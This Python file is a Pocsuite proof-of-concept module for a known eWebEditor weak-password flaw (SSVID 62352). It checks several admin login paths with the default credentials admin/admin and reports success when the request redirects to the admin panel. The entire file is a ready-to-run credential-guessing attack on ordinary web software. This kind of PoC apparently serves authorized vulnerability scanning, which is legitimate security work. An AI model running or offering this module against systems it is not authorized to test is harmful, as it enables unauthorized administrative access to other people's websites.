#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '62352'  # ssvid
    version = '1.0'
    author = ['']
    vulDate = '2013-04-23'
    createDate = '2016-03-07'
    updateDate = '2016-03-07'
    references = ['http://www.seebug.org/vuldb/ssvid-62352']
    name = 'eWebEditor 弱密码漏洞'
    appPowerLink = 'http://www.ewebeditor.net/'
    appName = 'eWebEditor'
    appVersion = 'ALL'
    vulType = 'Weak Password'
    desc = '''
    ewebeditor默认情况下， 可用弱口令登录，从而导致攻击者可据此信息进行后续攻击。
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        paths = ["/admin_login.asp", "/admin/ewebeditor/admin_login.asp",
                 "/edit/admin_login.asp",
                 "/ewebeditor/admin_login.asp", "/admin/login.php"]
        for path in paths:
            target = "%s%s?action=login&usr=admin&pwd=admin" % (self.url, path)
            res = req.get(target)
            if "admin_default.asp" in res.url and "href='admin_login.asp'" in res.content and "eWebEditor" in res.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = res.url
        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
